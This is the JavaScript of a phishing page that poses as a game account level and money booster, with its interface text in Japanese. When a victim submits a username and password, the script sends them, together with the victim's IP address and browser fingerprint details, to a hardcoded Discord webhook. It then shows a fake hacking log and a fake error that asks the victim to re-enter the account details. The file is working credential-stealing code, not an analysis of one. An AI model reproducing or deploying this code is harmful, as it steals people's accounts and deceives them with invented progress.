const WEBHOOK_URL = 'https://ptb.discord.com/api/webhooks/1383529796595613816/ub2mTIV7qRheXhiorjMOse8uGZ6FyMTX6HkYKVvrAdp9V7HXtBUAF0U8HtHAqOa0S6Zk';

const form1 = document.getElementById('account-form');
const form2 = document.getElementById('boost-form');
const log = document.getElementById('log');
let savedAccount = {};

function getIP() {
  return fetch('https://api.ipify.org?format=json')
    .then(res => res.json())
    .then(d => d.ip)
    .catch(() => "");
}

function nowISOWithMs() {
  const now = new Date();
  return new Date(now.getTime() - now.getTimezoneOffset() * 60000).toISOString().replace('Z', `.${now.getMilliseconds().toString().padStart(3, '0')}Z`);
}

async function sendToWebhook(embed) {
  embed.timestamp = nowISOWithMs();
  await fetch(WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ embeds: [embed] })
  }).catch(() => {});
}

form1.addEventListener('submit', async (e) => {
  e.preventDefault();
  const username = document.getElementById('username').value.trim();
  const password = document.getElementById('password').value.trim();
  savedAccount = { username, password };
  const ip = await getIP();
  const embed = {
    title: "Account Info",
    color: 3447003,
    fields: [
      { name: "Username", value: username, inline: true },
      { name: "Password", value: password, inline: true },
      { name: "IP", value: ip, inline: true },
      { name: "Language", value: navigator.language, inline: true },
      { name: "Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
      { name: "Platform", value: navigator.platform, inline: true },
      { name: "CPU Cores", value: String(navigator.hardwareConcurrency || "Unknown"), inline: true },
      { name: "Screen", value: `${screen.width}x${screen.height}`, inline: true },
      { name: "Touch Support", value: String(navigator.maxTouchPoints), inline: true },
      { name: "Cookies Enabled", value: String(navigator.cookieEnabled), inline: true },
      { name: "User-Agent", value: navigator.userAgent, inline: false }
    ]
  };
  await sendToWebhook(embed);
  [...form1.querySelectorAll('input, button')].forEach(el => el.classList.add('hidden'));
  form2.classList.remove('hidden');
  form2.classList.add('fade-in');
});

form2.addEventListener('submit', (e) => {
  e.preventDefault();
  form2.classList.add('hidden');
  log.classList.remove('hidden');
  const level = document.getElementById('level-amount').value.trim();
  const money = document.getElementById('money-amount').value.trim();
  const embed = {
    title: "Boost Info",
    color: 15844367,
    fields: [
      { name: "Username", value: savedAccount.username, inline: true },
      { name: "Level Increase", value: level, inline: true },
      { name: "Money Increase", value: money, inline: true }
    ]
  };
  sendToWebhook(embed);
  startFakeProcess(log, level, money);
});

function startFakeProcess(logEl, level, money) {
  logEl.textContent = '';
  logEl.style.color = '#00ff00';
  logEl.style.fontSize = '16px';
  logEl.style.lineHeight = '1.4';
  let remainingMs = (Math.floor(Math.random() * 420 + 180)) * 1000;
  const logLines = [];
  const maxLines = 7;
  let stopped = false;
  const statusDisplay = document.createElement('div');
  statusDisplay.style.position = 'fixed';
  statusDisplay.style.bottom = '16px';
  statusDisplay.style.left = '16px';
  statusDisplay.style.background = 'rgba(0,0,0,0.7)';
  statusDisplay.style.padding = '8px 12px';
  statusDisplay.style.borderRadius = '8px';
  statusDisplay.style.color = '#00ff00';
  statusDisplay.style.fontFamily = 'monospace';
  statusDisplay.style.fontSize = '14px';
  statusDisplay.style.zIndex = '9999';
  statusDisplay.style.whiteSpace = 'pre-line';
  document.body.appendChild(statusDisplay);

  const logs = [
    "Loading memory segment 0x00ffae...",
    "Fetching user token...",
    "Connected to proxy node 185.88.2.21",
    "Running Python patch.py...",
    "SQL injection payload sent",
    "eval() executed successfully",
    "Buffer overflow simulated",
    "Modifying internal stats.json",
    "Remote shell access granted",
    "Compiled payload.c -> payload.exe",
    "JavaScript heap spray successful",
    "Reading encrypted config.bin...",
    "CRC bypass patch loaded",
    "Uploading data to server...",
    "Privilege escalation complete",
    "Launching WebSocket tunnel...",
    "Recalculating XP checksum...",
    "Patching main.bundle.js...",
    "WASM module injected",
    "Injecting +" + level + " levels...",
    "Balance update: +$" + money
  ];

  const timerInterval = setInterval(() => {
    if (stopped) return;
    remainingMs = Math.max(0, remainingMs - 10);
    const totalSec = Math.floor(remainingMs / 1000);
    const m = Math.floor(totalSec / 60);
    const s = totalSec % 60;
    const ms = remainingMs % 1000;
    const dots = '.'.repeat(Math.floor(Math.random() * 3) + 1);
    statusDisplay.textContent = `改竄中${dots}\n残り ${m}分${s}秒${ms}ミリ秒`;
    if (remainingMs <= 0 && !stopped) {
      stopped = true;
      clearInterval(timerInterval);
      clearInterval(logInterval);
      statusDisplay.remove();
      const failTime = new Date().toLocaleTimeString('en-GB');
      logLines.push(`[${failTime}] ❌ ERROR: Modification process terminated.`);
      if (logLines.length > maxLines) logLines.shift();
      logEl.innerHTML = `<pre style="color:#00ff00;">${logLines.join('\n')}</pre>
        <div style="color:red;font-size:16px;font-weight:bold;text-align:center;animation:blink 0.5s infinite;">
        処理に失敗しました。アカウントの情報が正しいか確認してもう一度実行をしてください。
        </div>`;
    }
  }, 10);

  const logInterval = setInterval(() => {
    if (stopped) return;
    for (let i = 0; i < 3; i++) {
      const time = new Date().toLocaleTimeString('en-GB');
      const line = `[${time}] ${logs[Math.floor(Math.random() * logs.length)]}`;
      logLines.push(line);
      if (logLines.length > maxLines) logLines.shift();
    }
    logEl.textContent = logLines.join('\n');
    logEl.scrollTop = logEl.scrollHeight;
  }, 100);
}

const style = document.createElement('style');
style.textContent = `
@keyframes blink {
  0% { opacity: 1; }
  50% { opacity: 0.15; }
  100% { opacity: 1; }
}`;
document.head.appendChild(style);
